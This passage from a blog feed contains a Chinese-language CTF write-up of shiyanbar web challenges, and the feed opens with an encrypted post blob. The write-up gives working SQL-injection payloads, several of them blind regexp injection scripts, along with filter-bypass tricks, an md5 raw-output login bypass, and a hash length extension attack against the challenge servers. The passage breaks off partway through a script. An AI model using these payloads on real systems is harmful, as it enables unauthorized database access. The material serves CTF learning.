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
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
        <categories>
            
            <category> 随笔 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> essay </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[实验吧web]]></title>
      <url>/2018/06/10/%E5%AE%9E%E9%AA%8C%E5%90%A7web/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近把bugku的题目做的差不多了，发现自己还是菜的要死(扎心..)，所以决定再做一做实验吧的题目</p>
<a id="more"></a>
<h1 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h1><p>打开网页后查看元素发现sql逻辑语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">admin</span> <span class="keyword">WHERE</span> username = <span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">'".md5($password,true)."'</span><span class="string">";</span></span><br></pre></td></tr></table></figure>
<p>这个不知道密码，此处思路是md5()函数返回16进制字符串，然后16进制字符串会和SQL语句拼接，如果能够凑出一个password的字符串为 <code>&#39; or &#39;a</code> 这样的内容的话，不就可以绕过了，那么去哪找这样的字符串呢，一看题目url，看到了 <code>ffifdyop</code> ,直接提交一下这个东西，居然正好就是可以。</p>
<h1 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h1><p>本题一开始我以为是报错注入，结果才知道是个盲注，题目过滤了很多东西，比如union,substr,=等，所以尝试正则注入，这也是我第一次写这个方面脚本，可能是网速的原因，注入非常慢，这里就只写一下其中的一个payload，注意：正则表达式需要对特殊字符添加转义才可以。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keys = string.ascii_lowercase + <span class="string">r'!_&#123;&#125;@~,'</span> + string.digits</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">flag_yes = <span class="string">'You are our member'</span></span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/baocuo/index.php'</span></span><br><span class="line">payload = <span class="string">"' or (select group_concat(column_name) from information_schema.tables where !(table_schema &lt;&gt; database())) regexp '^&#123;&#125;' and 2&gt;'1"</span></span><br><span class="line">data = &#123;<span class="string">'username'</span>:<span class="string">'aa'</span>,<span class="string">'password'</span>:payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> keys:</span><br><span class="line">		tmp = item</span><br><span class="line">		data[<span class="string">'password'</span>] = payload.format(flag + tmp)</span><br><span class="line">		res = requests.post(url,data=data).text</span><br><span class="line">		<span class="keyword">if</span> flag_yes <span class="keyword">in</span> res:</span><br><span class="line">			flag += tmp</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	print(i)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'database:'</span>,flag)</span><br></pre></td></tr></table></figure>
<h1 id="认真一点！"><a href="#认真一点！" class="headerlink" title="认真一点！"></a>认真一点！</h1><p>这题看了别人的wp，确实6啊，自己的注入还是太菜鸡了</p>
<p>直接id=0或id=1发现页面回显不同，应该是盲注，再输入id=1aaaaaa,发现也可以回显，于是可以利用这个来测试过滤了，输入id=1or,会发现被过滤，继续用相同方法测试发现<br><code>and,空格，^,union,substr,逗号,%</code>等许多都被过滤了，但是发现引号没有被过滤，可以继续测试尝试闭合<code>id=0&#39;%0aoorr%0a&#39;or&#39;=&#39;*</code>，这说明or是被当做空格处理一次这样的方式过滤的，之前也试过/**/但是没有用,才使用%0a绕过空格过滤，接下来考试考虑盲注，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">keys = string.ascii_lowercase + string.digits + <span class="string">r'!_&#123;&#125;@~.'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">flag_yes = <span class="string">'You are in'</span></span><br><span class="line">url = <span class="string">r'http://ctf5.shiyanbar.com/web/earnest/index.php'</span></span><br><span class="line">payload = <span class="string">"0'%0aoorr%0a((select%0agroup_concat(table_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.tables%0awhere%0atable_schema=database())%0aregexp%0a"</span> + <span class="string">"'&#123;&#125;$')"</span> + <span class="string">"%0aoorr%0a'b'='a"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind_inje</span><span class="params">(payload)</span>:</span></span><br><span class="line">	flag = <span class="string">''</span></span><br><span class="line">	data = &#123;<span class="string">'id'</span>:payload&#125;</span><br><span class="line">	ok = <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">while</span> ok:</span><br><span class="line">		<span class="keyword">for</span> item <span class="keyword">in</span> keys:</span><br><span class="line">			data[<span class="string">'id'</span>] = parse.unquote(payload.format(item + flag))</span><br><span class="line">			res = requests.post(url,data=data).text</span><br><span class="line">			<span class="comment"># print(payload.format(item + flag))</span></span><br><span class="line">			<span class="keyword">if</span> flag_yes <span class="keyword">in</span> res:</span><br><span class="line">				flag = item + flag</span><br><span class="line">				print(flag)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">if</span> item == <span class="string">'.'</span>:</span><br><span class="line">				ok = <span class="keyword">False</span></span><br><span class="line">	print(<span class="string">'[+]:'</span>,flag)</span><br><span class="line"><span class="comment"># blind_inje(payload)</span></span><br><span class="line"><span class="comment"># table_name:fiag@users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload1 = "0'%0aoorr%0a((select%0agroup_concat(column_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.columns%0awhere%0atable_name='fiag')%0aregexp%0a" + "'&#123;&#125;$')" + "%0aoorr%0a'b'='a"</span></span><br><span class="line"><span class="comment"># blind_inje(payload1)</span></span><br><span class="line"><span class="comment"># column_name:fl.4g或者fl$4g</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"0'%0aoorr%0a((select%0agroup_concat(fl$4g)%0afrom%0afiag)%0aregexp%0a'&#123;&#125;$')%0aoorr%0a'b'='a"</span></span><br><span class="line">blind_inje(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag:flag&#123;haha~you.win!&#125;注意点号只是一个通配符，所以这个点究竟是那个字符得多试几次</span></span><br><span class="line"><span class="comment"># flag:flag&#123;haha~you win!&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h1><p>题目给出了加密代码，直接逆向跑一遍就好了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$str = <span class="string">'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws'</span>;</span><br><span class="line">$str = base64_decode(strrev(str_rot13($str)));</span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">	$_c = substr($str, $i, <span class="number">1</span>);</span><br><span class="line">	$a = ord($_c);</span><br><span class="line">	$b = chr($a<span class="number">-1</span>);</span><br><span class="line">	$flag = $flag.$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> strrev($flag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="登录一下好吗"><a href="#登录一下好吗" class="headerlink" title="登录一下好吗"></a>登录一下好吗</h1><p>先随便输入信息登录，页面会显示你的登录用户名和密码，需要注意的是页面返回的是处理之后的数据，所以可以据此判断哪些字符遭到了过滤，比如 <code>uesrname=admin&#39; or 1=1</code>,前端回显就没有了or，说明or被过滤，剩下的就不说了，本题可以使用万能密码，payload</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=<span class="string">'='</span>&amp;password=<span class="string">'='</span></span><br></pre></td></tr></table></figure>
<p>那么在数据库中就变成了 <code>select * from users where username=&#39;&#39;=&#39;&#39; and password=&#39;&#39;=&#39;&#39;</code> ，所以就成了<code>select * from users where 1 and 1</code> 注意他逻辑运算的时候是一次从前往后运算的。</p>
<h1 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h1><p>看题目描述可知这题考察脚本编写，因为他要求你立即在限定时间内提交返回的base64解码的值，如果手工操作速度肯定来不及，所以直接上脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url).headers[<span class="string">'FLAG'</span>]</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(response)</span><br><span class="line"></span><br><span class="line">flag = flag.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">flag = flag.split(<span class="string">':'</span>)</span><br><span class="line">flag = flag[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'key'</span>:flag&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url,data=data).text</span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<p>可以得到flag</p>
<h1 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h1><p>修改cookie里的source的值为1可以看到源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码逻辑要求username=admin而password不等于admin，然后cookie里面的getmein的MD5值与$secret+username+password的值拼接取MD5相等即可绕过验证，这里需要用到hash长度扩展攻击，具体原理可以参看网上其他文章，这里推荐一个工具Python包hashpump，我是在linux下使用的</p>
<p><img src="实验吧web/1.png" alt="payload"></p>
<h1 id="简单的SQL注入3"><a href="#简单的SQL注入3" class="headerlink" title="简单的SQL注入3"></a>简单的SQL注入3</h1><p>题目虽然说的是报错注入，但是确保报错注入的函数给过滤完了，所以题目实际上是个盲注，直接盲注就可以了，上一波脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/index_3.php'</span></span><br><span class="line">payload = <span class="string">"?id=0' or (substr(database(),&#123;&#125;,1)='&#123;&#125;')%23"</span>  <span class="comment"># database:web1</span></span><br><span class="line">words = string.ascii_lowercase + string.digits + <span class="string">'&#123;&#125;_!~@%^&amp;*-'</span></span><br><span class="line">flag_yes = <span class="string">'Hello'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">payload1 = <span class="string">"?id=0' or (substr((select group_concat(table_name separator '@') from information_schema.tables where 